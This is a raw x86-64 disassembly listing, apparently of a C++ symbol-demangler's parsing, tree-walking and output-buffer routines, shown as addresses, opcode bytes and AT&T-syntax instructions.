   2dc493b6a:	45 8d 4b 03          	lea    0x3(%r11),%r9d
   2dc493b6e:	80 fa 52             	cmp    $0x52,%dl
   2dc493b71:	74 1d                	je     0x2dc493b90
   2dc493b73:	44 89 49 48          	mov    %r9d,0x48(%rcx)
   2dc493b77:	48 83 c0 01          	add    $0x1,%rax
   2dc493b7b:	45 31 c9             	xor    %r9d,%r9d
   2dc493b7e:	44 89 d2             	mov    %r10d,%edx
   2dc493b81:	48 89 41 18          	mov    %rax,0x18(%rcx)
   2dc493b85:	e9 06 fd ff ff       	jmp    0x2dc493890
   2dc493b8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc493b90:	45 8d 4b 02          	lea    0x2(%r11),%r9d
   2dc493b94:	41 ba 1f 00 00 00    	mov    $0x1f,%r10d
   2dc493b9a:	eb d7                	jmp    0x2dc493b73
   2dc493b9c:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc493ba0:	48 83 ec 28          	sub    $0x28,%rsp
   2dc493ba4:	48 8b 41 18          	mov    0x18(%rcx),%rax
   2dc493ba8:	80 38 5f             	cmpb   $0x5f,(%rax)
   2dc493bab:	74 13                	je     0x2dc493bc0
   2dc493bad:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc493bb2:	48 83 c4 28          	add    $0x28,%rsp
   2dc493bb6:	c3                   	ret
   2dc493bb7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc493bbe:	00 00 
   2dc493bc0:	48 8d 50 01          	lea    0x1(%rax),%rdx
   2dc493bc4:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   2dc493bc8:	80 78 01 5f          	cmpb   $0x5f,0x1(%rax)
   2dc493bcc:	74 12                	je     0x2dc493be0
   2dc493bce:	e8 2d fe ff ff       	call   0x2dc493a00
   2dc493bd3:	85 c0                	test   %eax,%eax
   2dc493bd5:	79 d6                	jns    0x2dc493bad
   2dc493bd7:	31 c0                	xor    %eax,%eax
   2dc493bd9:	eb d7                	jmp    0x2dc493bb2
   2dc493bdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc493be0:	48 83 c0 02          	add    $0x2,%rax
   2dc493be4:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   2dc493be9:	48 89 41 18          	mov    %rax,0x18(%rcx)
   2dc493bed:	e8 0e fe ff ff       	call   0x2dc493a00
   2dc493bf2:	85 c0                	test   %eax,%eax
   2dc493bf4:	78 e1                	js     0x2dc493bd7
   2dc493bf6:	83 f8 09             	cmp    $0x9,%eax
   2dc493bf9:	7e b2                	jle    0x2dc493bad
   2dc493bfb:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   2dc493c00:	48 8b 41 18          	mov    0x18(%rcx),%rax
   2dc493c04:	80 38 5f             	cmpb   $0x5f,(%rax)
   2dc493c07:	75 ce                	jne    0x2dc493bd7
   2dc493c09:	48 83 c0 01          	add    $0x1,%rax
   2dc493c0d:	48 89 41 18          	mov    %rax,0x18(%rcx)
   2dc493c11:	eb 9a                	jmp    0x2dc493bad
   2dc493c13:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc493c1a:	00 00 00 00 
   2dc493c1e:	66 90                	xchg   %ax,%ax
   2dc493c20:	56                   	push   %rsi
   2dc493c21:	53                   	push   %rbx
   2dc493c22:	48 83 ec 28          	sub    $0x28,%rsp
   2dc493c26:	48 89 ce             	mov    %rcx,%rsi
   2dc493c29:	48 89 d3             	mov    %rdx,%rbx
   2dc493c2c:	48 85 d2             	test   %rdx,%rdx
   2dc493c2f:	74 76                	je     0x2dc493ca7
   2dc493c31:	8b 43 08             	mov    0x8(%rbx),%eax
   2dc493c34:	83 f8 01             	cmp    $0x1,%eax
   2dc493c37:	7f 6e                	jg     0x2dc493ca7
   2dc493c39:	8b 96 34 01 00 00    	mov    0x134(%rsi),%edx
   2dc493c3f:	81 fa 00 04 00 00    	cmp    $0x400,%edx
   2dc493c45:	7f 60                	jg     0x2dc493ca7
   2dc493c47:	8b 0b                	mov    (%rbx),%ecx
   2dc493c49:	83 c0 01             	add    $0x1,%eax
   2dc493c4c:	89 43 08             	mov    %eax,0x8(%rbx)
   2dc493c4f:	83 f9 33             	cmp    $0x33,%ecx
   2dc493c52:	0f 87 98 00 00 00    	ja     0x2dc493cf0
   2dc493c58:	83 f9 08             	cmp    $0x8,%ecx
   2dc493c5b:	77 53                	ja     0x2dc493cb0
   2dc493c5d:	83 f9 07             	cmp    $0x7,%ecx
   2dc493c60:	74 7e                	je     0x2dc493ce0
   2dc493c62:	83 f9 08             	cmp    $0x8,%ecx
   2dc493c65:	74 79                	je     0x2dc493ce0
   2dc493c67:	83 f9 03             	cmp    $0x3,%ecx
   2dc493c6a:	0f 86 e0 00 00 00    	jbe    0x2dc493d50
   2dc493c70:	83 f9 04             	cmp    $0x4,%ecx
   2dc493c73:	75 32                	jne    0x2dc493ca7
   2dc493c75:	83 86 6c 01 00 00 01 	addl   $0x1,0x16c(%rsi)
   2dc493c7c:	48 8b 43 10          	mov    0x10(%rbx),%rax
   2dc493c80:	83 c2 01             	add    $0x1,%edx
   2dc493c83:	48 89 f1             	mov    %rsi,%rcx
   2dc493c86:	89 96 34 01 00 00    	mov    %edx,0x134(%rsi)
   2dc493c8c:	48 89 c2             	mov    %rax,%rdx
   2dc493c8f:	e8 8c ff ff ff       	call   0x2dc493c20
   2dc493c94:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   2dc493c98:	48 89 f1             	mov    %rsi,%rcx
   2dc493c9b:	e8 80 ff ff ff       	call   0x2dc493c20
   2dc493ca0:	83 ae 34 01 00 00 01 	subl   $0x1,0x134(%rsi)
   2dc493ca7:	48 83 c4 28          	add    $0x28,%rsp
   2dc493cab:	5b                   	pop    %rbx
   2dc493cac:	5e                   	pop    %rsi
   2dc493cad:	c3                   	ret
   2dc493cae:	66 90                	xchg   %ax,%ax
   2dc493cb0:	49 b8 00 fe ff fe 67 	movabs $0x3ef67fefffe00,%r8
   2dc493cb7:	ef 03 00 
   2dc493cba:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc493cbf:	48 d3 e0             	shl    %cl,%rax
   2dc493cc2:	4c 85 c0             	test   %r8,%rax
   2dc493cc5:	75 b5                	jne    0x2dc493c7c
   2dc493cc7:	49 b8 00 00 00 00 18 	movabs $0x1800000000,%r8
   2dc493cce:	00 00 00 
   2dc493cd1:	4c 85 c0             	test   %r8,%rax
   2dc493cd4:	75 5a                	jne    0x2dc493d30
   2dc493cd6:	83 f9 33             	cmp    $0x33,%ecx
   2dc493cd9:	75 cc                	jne    0x2dc493ca7
   2dc493cdb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   2dc493ce0:	48 8b 5b 18          	mov    0x18(%rbx),%rbx
   2dc493ce4:	48 85 db             	test   %rbx,%rbx
   2dc493ce7:	0f 85 44 ff ff ff    	jne    0x2dc493c31
   2dc493ced:	eb b8                	jmp    0x2dc493ca7
   2dc493cef:	90                   	nop
   2dc493cf0:	83 e9 34             	sub    $0x34,%ecx
   2dc493cf3:	83 f9 21             	cmp    $0x21,%ecx
   2dc493cf6:	77 af                	ja     0x2dc493ca7
   2dc493cf8:	b8 01 00 00 00       	mov    $0x1,%eax
   2dc493cfd:	48 d3 e0             	shl    %cl,%rax
   2dc493d00:	a9 ff 3f c1 3f       	test   $0x3fc13fff,%eax
   2dc493d05:	0f 85 71 ff ff ff    	jne    0x2dc493c7c
   2dc493d0b:	48 ba 00 00 06 00 02 	movabs $0x200060000,%rdx
   2dc493d12:	00 00 00 
   2dc493d15:	48 85 d0             	test   %rdx,%rax
   2dc493d18:	75 07                	jne    0x2dc493d21
   2dc493d1a:	a9 00 00 18 00       	test   $0x180000,%eax
   2dc493d1f:	74 86                	je     0x2dc493ca7
   2dc493d21:	48 8b 5b 10          	mov    0x10(%rbx),%rbx
   2dc493d25:	eb bd                	jmp    0x2dc493ce4
   2dc493d27:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc493d2e:	00 00 
   2dc493d30:	48 8b 43 10          	mov    0x10(%rbx),%rax
   2dc493d34:	83 38 05             	cmpl   $0x5,(%rax)
   2dc493d37:	0f 85 43 ff ff ff    	jne    0x2dc493c80
   2dc493d3d:	83 86 5c 01 00 00 01 	addl   $0x1,0x15c(%rsi)
   2dc493d44:	e9 37 ff ff ff       	jmp    0x2dc493c80
   2dc493d49:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc493d50:	85 c9                	test   %ecx,%ecx
   2dc493d52:	0f 85 24 ff ff ff    	jne    0x2dc493c7c
   2dc493d58:	e9 4a ff ff ff       	jmp    0x2dc493ca7
   2dc493d5d:	0f 1f 00             	nopl   (%rax)
   2dc493d60:	31 c0                	xor    %eax,%eax
   2dc493d62:	48 85 c9             	test   %rcx,%rcx
   2dc493d65:	75 1c                	jne    0x2dc493d83
   2dc493d67:	eb 1f                	jmp    0x2dc493d88
   2dc493d69:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc493d70:	48 83 79 10 00       	cmpq   $0x0,0x10(%rcx)
   2dc493d75:	74 11                	je     0x2dc493d88
   2dc493d77:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   2dc493d7b:	83 c0 01             	add    $0x1,%eax
   2dc493d7e:	48 85 c9             	test   %rcx,%rcx
   2dc493d81:	74 05                	je     0x2dc493d88
   2dc493d83:	83 39 2f             	cmpl   $0x2f,(%rcx)
   2dc493d86:	74 e8                	je     0x2dc493d70
   2dc493d88:	c3                   	ret
   2dc493d89:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc493d90:	48 85 c9             	test   %rcx,%rcx
   2dc493d93:	75 1b                	jne    0x2dc493db0
   2dc493d95:	eb 1e                	jmp    0x2dc493db5
   2dc493d97:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc493d9e:	00 00 
   2dc493da0:	85 d2                	test   %edx,%edx
   2dc493da2:	74 1c                	je     0x2dc493dc0
   2dc493da4:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   2dc493da8:	83 ea 01             	sub    $0x1,%edx
   2dc493dab:	48 85 c9             	test   %rcx,%rcx
   2dc493dae:	74 05                	je     0x2dc493db5
   2dc493db0:	83 39 2f             	cmpl   $0x2f,(%rcx)
   2dc493db3:	74 eb                	je     0x2dc493da0
   2dc493db5:	31 c0                	xor    %eax,%eax
   2dc493db7:	c3                   	ret
   2dc493db8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc493dbf:	00 
   2dc493dc0:	48 8b 41 10          	mov    0x10(%rcx),%rax
   2dc493dc4:	c3                   	ret
   2dc493dc5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc493dcc:	00 00 00 00 
   2dc493dd0:	55                   	push   %rbp
   2dc493dd1:	57                   	push   %rdi
   2dc493dd2:	56                   	push   %rsi
   2dc493dd3:	53                   	push   %rbx
   2dc493dd4:	48 83 ec 28          	sub    $0x28,%rsp
   2dc493dd8:	49 8b 40 08          	mov    0x8(%r8),%rax
   2dc493ddc:	49 8b 70 10          	mov    0x10(%r8),%rsi
   2dc493de0:	48 8d 44 02 01       	lea    0x1(%rdx,%rax,1),%rax
   2dc493de5:	48 89 d7             	mov    %rdx,%rdi
   2dc493de8:	48 89 cd             	mov    %rcx,%rbp
   2dc493deb:	41 8b 50 18          	mov    0x18(%r8),%edx
   2dc493def:	4c 89 c3             	mov    %r8,%rbx
   2dc493df2:	48 39 c6             	cmp    %rax,%rsi
   2dc493df5:	72 39                	jb     0x2dc493e30
   2dc493df7:	8b 43 18             	mov    0x18(%rbx),%eax
   2dc493dfa:	85 c0                	test   %eax,%eax
   2dc493dfc:	75 23                	jne    0x2dc493e21
   2dc493dfe:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   2dc493e02:	49 89 f8             	mov    %rdi,%r8
   2dc493e05:	48 03 0b             	add    (%rbx),%rcx
   2dc493e08:	48 89 ea             	mov    %rbp,%rdx
   2dc493e0b:	e8 d0 0f 01 00       	call   0x2dc4a4de0
   2dc493e10:	48 8b 03             	mov    (%rbx),%rax
   2dc493e13:	48 01 f8             	add    %rdi,%rax
   2dc493e16:	48 03 43 08          	add    0x8(%rbx),%rax
   2dc493e1a:	c6 00 00             	movb   $0x0,(%rax)
   2dc493e1d:	48 01 7b 08          	add    %rdi,0x8(%rbx)
   2dc493e21:	48 83 c4 28          	add    $0x28,%rsp
   2dc493e25:	5b                   	pop    %rbx
   2dc493e26:	5e                   	pop    %rsi
   2dc493e27:	5f                   	pop    %rdi
   2dc493e28:	5d                   	pop    %rbp
   2dc493e29:	c3                   	ret
   2dc493e2a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc493e30:	85 d2                	test   %edx,%edx
   2dc493e32:	75 ed                	jne    0x2dc493e21
   2dc493e34:	48 85 f6             	test   %rsi,%rsi
   2dc493e37:	74 2f                	je     0x2dc493e68
   2dc493e39:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc493e40:	48 01 f6             	add    %rsi,%rsi
   2dc493e43:	48 39 c6             	cmp    %rax,%rsi
   2dc493e46:	72 f8                	jb     0x2dc493e40
   2dc493e48:	48 8b 0b             	mov    (%rbx),%rcx
   2dc493e4b:	48 89 f2             	mov    %rsi,%rdx
   2dc493e4e:	e8 dd 0f 01 00       	call   0x2dc4a4e30
   2dc493e53:	48 85 c0             	test   %rax,%rax
   2dc493e56:	74 1d                	je     0x2dc493e75
   2dc493e58:	48 89 03             	mov    %rax,(%rbx)
   2dc493e5b:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   2dc493e5f:	eb 96                	jmp    0x2dc493df7
   2dc493e61:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc493e68:	be 02 00 00 00       	mov    $0x2,%esi
   2dc493e6d:	48 83 f8 02          	cmp    $0x2,%rax
   2dc493e71:	77 cd                	ja     0x2dc493e40
   2dc493e73:	eb d3                	jmp    0x2dc493e48
   2dc493e75:	48 8b 0b             	mov    (%rbx),%rcx
   2dc493e78:	e8 a3 0f 01 00       	call   0x2dc4a4e20
   2dc493e7d:	31 d2                	xor    %edx,%edx
   2dc493e7f:	66 0f ef c0          	pxor   %xmm0,%xmm0
   2dc493e83:	c7 43 18 01 00 00 00 	movl   $0x1,0x18(%rbx)
   2dc493e8a:	48 89 13             	mov    %rdx,(%rbx)
   2dc493e8d:	0f 11 43 08          	movups %xmm0,0x8(%rbx)
   2dc493e91:	eb 8e                	jmp    0x2dc493e21
   2dc493e93:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc493e9a:	00 00 00 00 
   2dc493e9e:	66 90                	xchg   %ax,%ax
   2dc493ea0:	48 8b 41 10          	mov    0x10(%rcx),%rax
   2dc493ea4:	48 8b 10             	mov    (%rax),%rdx
   2dc493ea7:	31 c0                	xor    %eax,%eax
   2dc493ea9:	80 3a 64             	cmpb   $0x64,(%rdx)
   2dc493eac:	74 02                	je     0x2dc493eb0
   2dc493eae:	c3                   	ret
   2dc493eaf:	90                   	nop
   2dc493eb0:	0f b6 52 01          	movzbl 0x1(%rdx),%edx
   2dc493eb4:	83 ea 58             	sub    $0x58,%edx
   2dc493eb7:	80 fa 20             	cmp    $0x20,%dl
   2dc493eba:	77 f2                	ja     0x2dc493eae
   2dc493ebc:	48 b8 01 00 02 00 01 	movabs $0x100020001,%rax
   2dc493ec3:	00 00 00 
   2dc493ec6:	48 0f a3 d0          	bt     %rdx,%rax
   2dc493eca:	0f 92 c0             	setb   %al
   2dc493ecd:	0f b6 c0             	movzbl %al,%eax
   2dc493ed0:	c3                   	ret
   2dc493ed1:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc493ed8:	00 00 00 00 
   2dc493edc:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc493ee0:	0f b6 11             	movzbl (%rcx),%edx
   2dc493ee3:	8d 42 b5             	lea    -0x4b(%rdx),%eax
   2dc493ee6:	3c 27                	cmp    $0x27,%al
   2dc493ee8:	76 0e                	jbe    0x2dc493ef8
   2dc493eea:	31 c0                	xor    %eax,%eax
   2dc493eec:	80 fa 44             	cmp    $0x44,%dl
   2dc493eef:	74 1f                	je     0x2dc493f10
   2dc493ef1:	c3                   	ret
   2dc493ef2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc493ef8:	48 ba fe f7 ff ff 7f 	movabs $0xffffff7ffffff7fe,%rdx
   2dc493eff:	ff ff ff 
   2dc493f02:	48 0f a3 c2          	bt     %rax,%rdx
   2dc493f06:	0f 92 c0             	setb   %al
   2dc493f09:	83 f0 01             	xor    $0x1,%eax
   2dc493f0c:	0f b6 c0             	movzbl %al,%eax
   2dc493f0f:	c3                   	ret
   2dc493f10:	0f b6 51 01          	movzbl 0x1(%rcx),%edx
   2dc493f14:	31 c0                	xor    %eax,%eax
   2dc493f16:	83 ea 4f             	sub    $0x4f,%edx
   2dc493f19:	80 fa 29             	cmp    $0x29,%dl
   2dc493f1c:	77 d3                	ja     0x2dc493ef1
   2dc493f1e:	48 b8 01 00 00 00 01 	movabs $0x30100000001,%rax
   2dc493f25:	03 00 00 
   2dc493f28:	48 0f a3 d0          	bt     %rdx,%rax
   2dc493f2c:	0f 92 c0             	setb   %al
   2dc493f2f:	0f b6 c0             	movzbl %al,%eax
   2dc493f32:	c3                   	ret
   2dc493f33:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   2dc493f3a:	00 00 00 00 
   2dc493f3e:	66 90                	xchg   %ax,%ax
   2dc493f40:	56                   	push   %rsi
   2dc493f41:	53                   	push   %rbx
   2dc493f42:	48 83 ec 28          	sub    $0x28,%rsp
   2dc493f46:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   2dc493f4d:	48 89 cb             	mov    %rcx,%rbx
   2dc493f50:	89 d6                	mov    %edx,%esi
   2dc493f52:	48 3d ff 00 00 00    	cmp    $0xff,%rax
   2dc493f58:	74 26                	je     0x2dc493f80
   2dc493f5a:	48 8d 50 01          	lea    0x1(%rax),%rdx
   2dc493f5e:	48 89 93 00 01 00 00 	mov    %rdx,0x100(%rbx)
   2dc493f65:	40 88 34 03          	mov    %sil,(%rbx,%rax,1)
   2dc493f69:	40 88 b3 08 01 00 00 	mov    %sil,0x108(%rbx)
   2dc493f70:	48 83 c4 28          	add    $0x28,%rsp
   2dc493f74:	5b                   	pop    %rbx
   2dc493f75:	5e                   	pop    %rsi
   2dc493f76:	c3                   	ret
   2dc493f77:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc493f7e:	00 00 
   2dc493f80:	ba ff 00 00 00       	mov    $0xff,%edx
   2dc493f85:	c6 81 ff 00 00 00 00 	movb   $0x0,0xff(%rcx)
   2dc493f8c:	4c 8b 81 18 01 00 00 	mov    0x118(%rcx),%r8
   2dc493f93:	ff 91 10 01 00 00    	call   *0x110(%rcx)
   2dc493f99:	83 83 40 01 00 00 01 	addl   $0x1,0x140(%rbx)
   2dc493fa0:	ba 01 00 00 00       	mov    $0x1,%edx
   2dc493fa5:	31 c0                	xor    %eax,%eax
   2dc493fa7:	eb b5                	jmp    0x2dc493f5e
   2dc493fa9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc493fb0:	48 8b 81 20 01 00 00 	mov    0x120(%rcx),%rax
   2dc493fb7:	48 85 c0             	test   %rax,%rax
   2dc493fba:	74 3c                	je     0x2dc493ff8
   2dc493fbc:	48 8b 40 08          	mov    0x8(%rax),%rax
   2dc493fc0:	8b 52 10             	mov    0x10(%rdx),%edx
   2dc493fc3:	48 8b 40 18          	mov    0x18(%rax),%rax
   2dc493fc7:	85 d2                	test   %edx,%edx
   2dc493fc9:	78 24                	js     0x2dc493fef
   2dc493fcb:	48 85 c0             	test   %rax,%rax
   2dc493fce:	75 18                	jne    0x2dc493fe8
   2dc493fd0:	eb 1b                	jmp    0x2dc493fed
   2dc493fd2:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc493fd8:	85 d2                	test   %edx,%edx
   2dc493fda:	74 14                	je     0x2dc493ff0
   2dc493fdc:	48 8b 40 18          	mov    0x18(%rax),%rax
   2dc493fe0:	83 ea 01             	sub    $0x1,%edx
   2dc493fe3:	48 85 c0             	test   %rax,%rax
   2dc493fe6:	74 05                	je     0x2dc493fed
   2dc493fe8:	83 38 2f             	cmpl   $0x2f,(%rax)
   2dc493feb:	74 eb                	je     0x2dc493fd8
   2dc493fed:	31 c0                	xor    %eax,%eax
   2dc493fef:	c3                   	ret
   2dc493ff0:	48 8b 40 10          	mov    0x10(%rax),%rax
   2dc493ff4:	c3                   	ret
   2dc493ff5:	0f 1f 00             	nopl   (%rax)
   2dc493ff8:	c7 81 30 01 00 00 01 	movl   $0x1,0x130(%rcx)
   2dc493fff:	00 00 00 
   2dc494002:	31 c0                	xor    %eax,%eax
   2dc494004:	eb e9                	jmp    0x2dc493fef
   2dc494006:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   2dc49400d:	00 00 00 
   2dc494010:	55                   	push   %rbp
   2dc494011:	57                   	push   %rdi
   2dc494012:	56                   	push   %rsi
   2dc494013:	53                   	push   %rbx
   2dc494014:	48 83 ec 28          	sub    $0x28,%rsp
   2dc494018:	48 89 ce             	mov    %rcx,%rsi
   2dc49401b:	48 89 d1             	mov    %rdx,%rcx
   2dc49401e:	48 89 d3             	mov    %rdx,%rbx
   2dc494021:	e8 ba 0c 01 00       	call   0x2dc4a4ce0
   2dc494026:	48 85 c0             	test   %rax,%rax
   2dc494029:	74 75                	je     0x2dc4940a0
   2dc49402b:	48 8b 96 00 01 00 00 	mov    0x100(%rsi),%rdx
   2dc494032:	48 8d 2c 03          	lea    (%rbx,%rax,1),%rbp
   2dc494036:	eb 2a                	jmp    0x2dc494062
   2dc494038:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc49403f:	00 
   2dc494040:	48 89 d1             	mov    %rdx,%rcx
   2dc494043:	48 83 c2 01          	add    $0x1,%rdx
   2dc494047:	48 83 c3 01          	add    $0x1,%rbx
   2dc49404b:	48 89 96 00 01 00 00 	mov    %rdx,0x100(%rsi)
   2dc494052:	40 88 3c 0e          	mov    %dil,(%rsi,%rcx,1)
   2dc494056:	40 88 be 08 01 00 00 	mov    %dil,0x108(%rsi)
   2dc49405d:	48 39 eb             	cmp    %rbp,%rbx
   2dc494060:	74 3e                	je     0x2dc4940a0
   2dc494062:	0f b6 3b             	movzbl (%rbx),%edi
   2dc494065:	48 81 fa ff 00 00 00 	cmp    $0xff,%rdx
   2dc49406c:	75 d2                	jne    0x2dc494040
   2dc49406e:	ba ff 00 00 00       	mov    $0xff,%edx
   2dc494073:	48 89 f1             	mov    %rsi,%rcx
   2dc494076:	c6 86 ff 00 00 00 00 	movb   $0x0,0xff(%rsi)
   2dc49407d:	4c 8b 86 18 01 00 00 	mov    0x118(%rsi),%r8
   2dc494084:	ff 96 10 01 00 00    	call   *0x110(%rsi)
   2dc49408a:	83 86 40 01 00 00 01 	addl   $0x1,0x140(%rsi)
   2dc494091:	ba 01 00 00 00       	mov    $0x1,%edx
   2dc494096:	31 c9                	xor    %ecx,%ecx
   2dc494098:	eb ad                	jmp    0x2dc494047
   2dc49409a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc4940a0:	48 83 c4 28          	add    $0x28,%rsp
   2dc4940a4:	5b                   	pop    %rbx
   2dc4940a5:	5e                   	pop    %rsi
   2dc4940a6:	5f                   	pop    %rdi
   2dc4940a7:	5d                   	pop    %rbp
   2dc4940a8:	c3                   	ret
   2dc4940a9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc4940b0:	56                   	push   %rsi
   2dc4940b1:	53                   	push   %rbx
   2dc4940b2:	48 83 ec 28          	sub    $0x28,%rsp
   2dc4940b6:	48 89 ce             	mov    %rcx,%rsi
   2dc4940b9:	48 89 d3             	mov    %rdx,%rbx
   2dc4940bc:	48 85 d2             	test   %rdx,%rdx
   2dc4940bf:	74 4f                	je     0x2dc494110
   2dc4940c1:	8b 03                	mov    (%rbx),%eax
   2dc4940c3:	83 f8 18             	cmp    $0x18,%eax
   2dc4940c6:	77 18                	ja     0x2dc4940e0
   2dc4940c8:	48 8d 15 bd 44 02 00 	lea    0x244bd(%rip),%rdx        # 0x2dc4b858c
   2dc4940cf:	48 63 04 82          	movslq (%rdx,%rax,4),%rax
   2dc4940d3:	48 01 d0             	add    %rdx,%rax
   2dc4940d6:	ff e0                	jmp    *%rax
   2dc4940d8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   2dc4940df:	00 
   2dc4940e0:	83 e8 27             	sub    $0x27,%eax
   2dc4940e3:	83 f8 35             	cmp    $0x35,%eax
   2dc4940e6:	77 38                	ja     0x2dc494120
   2dc4940e8:	48 ba 01 08 00 18 67 	movabs $0x20006718000801,%rdx
   2dc4940ef:	00 20 00 
   2dc4940f2:	48 0f a3 c2          	bt     %rax,%rdx
   2dc4940f6:	72 18                	jb     0x2dc494110
   2dc4940f8:	83 f8 0c             	cmp    $0xc,%eax
   2dc4940fb:	75 23                	jne    0x2dc494120
   2dc4940fd:	48 8b 5b 18          	mov    0x18(%rbx),%rbx
   2dc494101:	48 85 db             	test   %rbx,%rbx
   2dc494104:	75 bb                	jne    0x2dc4940c1
   2dc494106:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   2dc49410d:	00 00 00 
   2dc494110:	31 c0                	xor    %eax,%eax
   2dc494112:	48 83 c4 28          	add    $0x28,%rsp
   2dc494116:	5b                   	pop    %rbx
   2dc494117:	5e                   	pop    %rsi
   2dc494118:	c3                   	ret
   2dc494119:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   2dc494120:	48 8b 53 10          	mov    0x10(%rbx),%rdx
   2dc494124:	48 89 f1             	mov    %rsi,%rcx
   2dc494127:	e8 84 ff ff ff       	call   0x2dc4940b0
   2dc49412c:	48 85 c0             	test   %rax,%rax
   2dc49412f:	75 e1                	jne    0x2dc494112
   2dc494131:	48 8b 5b 18          	mov    0x18(%rbx),%rbx
   2dc494135:	48 85 db             	test   %rbx,%rbx
   2dc494138:	75 87                	jne    0x2dc4940c1
   2dc49413a:	eb d4                	jmp    0x2dc494110
   2dc49413c:	0f 1f 40 00          	nopl   0x0(%rax)
   2dc494140:	48 8b 86 20 01 00 00 	mov    0x120(%rsi),%rax
   2dc494147:	48 85 c0             	test   %rax,%rax
   2dc49414a:	74 4c                	je     0x2dc494198
   2dc49414c:	48 8b 40 08          	mov    0x8(%rax),%rax
   2dc494150:	8b 53 10             	mov    0x10(%rbx),%edx
   2dc494153:	48 8b 40 18          	mov    0x18(%rax),%rax
   2dc494157:	85 d2                	test   %edx,%edx
   2dc494159:	78 29                	js     0x2dc494184
   2dc49415b:	48 85 c0             	test   %rax,%rax
   2dc49415e:	75 18                	jne    0x2dc494178
   2dc494160:	eb ae                	jmp    0x2dc494110
   2dc494162:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   2dc494168:	85 d2                	test   %edx,%edx
   2dc49416a:	74 14                	je     0x2dc494180
   2dc49416c:	48 8b 40 18          	mov    0x18(%rax),%rax
   2dc494170:	83 ea 01             	sub    $0x1,%edx
   2dc494173:	48 85 c0             	test   %rax,%rax
   2dc494176:	74 98                	je     0x2dc494110
   2dc494178:	83 38 2f             	cmpl   $0x2f,(%rax)
   2dc49417b:	74 eb                	je     0x2dc494168
   2dc49417d:	eb 91                	jmp    0x2dc494110
   2dc49417f:	90                   	nop
   2dc494180:	48 8b 40 10          	mov    0x10(%rax),%rax
   2dc494184:	48 85 c0             	test   %rax,%rax
   2dc494187:	74 87                	je     0x2dc494110
   2dc494189:	83 38 2f             	cmpl   $0x2f,(%rax)
   2dc49418c:	75 82                	jne    0x2dc494110
   2dc49418e:	48 83 c4 28          	add    $0x28,%rsp
   2dc494192:	5b                   	pop    %rbx
   2dc494193:	5e                   	pop    %rsi
   2dc494194:	c3                   	ret
   2dc494195:	0f 1f 00             	nopl   (%rax)
   2dc494198:	c7 86 30 01 00 00 01 	movl   $0x1,0x130(%rsi)
   2dc49419f:	00 00 00 
   2dc4941a2:	e9 69 ff ff ff       	jmp    0x2dc494110
   2dc4941a7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   2dc4941ae:	00 00 
   2dc4941b0:	53                   	push   %rbx
   2dc4941b1:	48 83 ec 20          	sub    $0x20,%rsp
   2dc4941b5:	48 8b 41 18          	mov    0x18(%rcx),%rax
   2dc4941b9:	80 38 54             	cmpb   $0x54,(%rax)
   2dc4941bc:	48 89 cb             	mov    %rcx,%rbx
   2dc4941bf:	75 67                	jne    0x2dc494228
   2dc4941c1:	48 8d 50 01          	lea    0x1(%rax),%rdx
   2dc4941c5:	48 89 51 18          	mov    %rdx,0x18(%rcx)
   2dc4941c9:	0f b6 40 01          	movzbl 0x1(%rax),%eax
   2dc4941cd:	3c 5f                	cmp    $0x5f,%al
   2dc4941cf:	74 5f                	je     0x2dc494230
   2dc4941d1:	3c 6e                	cmp    $0x6e,%al
   2dc4941d3:	74 53                	je     0x2dc494228
   2dc4941d5:	e8 26 f8 ff ff       	call   0x2dc493a00
   2dc4941da:	83 c0 01             	add    $0x1,%eax
   2dc4941dd:	89 c1                	mov    %eax,%ecx
   2dc4941df:	78 47                	js     0x2dc494228
